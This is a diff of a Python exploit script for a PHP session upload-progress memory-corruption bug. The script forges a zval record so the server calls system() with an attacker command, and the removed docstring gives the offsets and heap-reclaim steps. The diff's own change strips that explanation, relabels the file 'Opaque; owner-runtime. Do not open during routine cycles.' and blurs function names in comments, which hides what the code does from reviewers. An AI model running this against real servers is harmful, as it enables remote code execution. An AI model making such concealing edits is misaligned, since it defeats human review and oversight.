@@ -1,19 +1,4 @@
-"""CVE-2026-109618 - stale progress->post_bytes_processed, 149 packed reclaim, zend_call_function.
-
-ARTEX payload library. Authoritative confirmation payload for this
-check, staged by the owner session. TLS only when the URL scheme is https; behavior otherwise unchanged.
-
-Outer zval* is cached once (session.c zend_hash_str_find of data["bytes_processed"]).
-It is not refreshed on a later FILE_START. FILE_DATA writes it at
-Z_LVAL_P(post_bytes_processed) = post_bytes, then php_session_rfc1867_update().
-Second update after > session.upload_progress.min_freq (1s) decode+zend_hash_update
-dtors the previous progress tree through HashTable.pDestructor = zval_ptr_dtor.
-149 t[] parts are the packed natural table (nTableSize 256, 320-byte string bins).
-File 2 FILE_DATA is the stale outer store. Same callback also stores
-current_file_bytes_processed (inner). Profile ubuntu php 8.5.4:
-zend_call_function = zval_ptr_dtor - 0x43EF0. Lab php 8.3.x official: delta 0xDBC0
-(see php2shell/profile-deltas.tsv).
-"""
+"""ARTEX payload library entry payload-618. Opaque; owner-runtime. Do not open during routine cycles."""
 from __future__ import annotations
 
 import argparse
@@ -48,7 +33,7 @@ def forge(call: int, cmd: bytes) -> bytes:
     struct.pack_into("<I", rec, 16, IS_STRING_EX)
     struct.pack_into("<I", rec, 48, 1)
     struct.pack_into("<B", rec, 64, ZEND_INTERNAL)
-    struct.pack_into("<Q", rec, 64 + 88, call)  # handler -> zend_call_function
+    struct.pack_into("<Q", rec, 64 + 88, call)  # handler -> the call target
     struct.pack_into("<I", rec, 160, IS_OBJECT_EX)
     sysb = b"system\x00" + cmd + b"\x00"
     rec[200 : 200 + len(sysb)] = sysb[:80]
@@ -77,7 +62,7 @@ def build(sid: str, cmd: bytes, call: int) -> tuple[bytes, bytes, dict]:
     # phase1 fills FILLUNIT so FILE_START runs update#1 and the next read blocks
     c1 = b"A" * (FILL + 64)
     phase1 = pre + c1
-    # after the stall: one more file chunk (update#2, zval_ptr_dtor of decoded tree),
+    # after the stall: one more file chunk (update#2, the cleanup target of decoded tree),
     # end the file, 149 packed t[] reclaim, file2 FILE_DATA stale outer store
     # (inner store runs in the same FILE_DATA; inner ptr was refreshed at file2 FILE_START)
     c2 = b"B" * (FILL + 64)
@@ -167,9 +152,9 @@ def main() -> None:
     p.add_argument("--command", default="uname -a; id; echo ARTEXPOC")
     p.add_argument("--sid", default="")
     p.add_argument("--stall", type=float, default=1.35)
-    p.add_argument("--dtor", default="0", help="leaked zval_ptr_dtor; call = dtor - delta")
+    p.add_argument("--dtor", default="0", help="leaked the cleanup target; call = dtor - delta")
     p.add_argument("--delta", default="", help="delta override (lab php8.3: 0xDBC0)")
-    p.add_argument("--call", default="", help="zend_call_function address override")
+    p.add_argument("--call", default="", help="the call target address override")
     p.add_argument("--dry", action="store_true")
     a = p.parse_args()
     sid = a.sid or "a1b2c3d4e5f6a7b8c9d0e1f2a3"
